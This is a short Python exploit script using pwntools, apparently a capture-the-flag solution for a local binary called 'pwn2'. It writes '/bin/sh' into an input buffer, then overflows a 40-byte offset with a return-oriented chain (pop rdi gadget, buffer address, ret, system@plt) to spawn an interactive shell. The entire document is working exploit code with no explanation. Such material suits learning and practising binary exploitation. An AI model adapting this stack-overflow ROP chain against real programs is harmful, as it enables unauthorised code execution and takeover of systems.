from pwn import *

elf = context.binary = ELF('../attachments/pwn2')
io = elf.process()

offset = 40

io.sendline(b'/bin/sh')

padding = b'A'*offset
pop_rdi = pack(0x401196)
bin_sh = pack(elf.symbols.input)
system = pack(elf.plt.system)
ret = pack(0x401287)

payload = padding + pop_rdi + bin_sh + ret + system
io.sendline(payload)

io.interactive()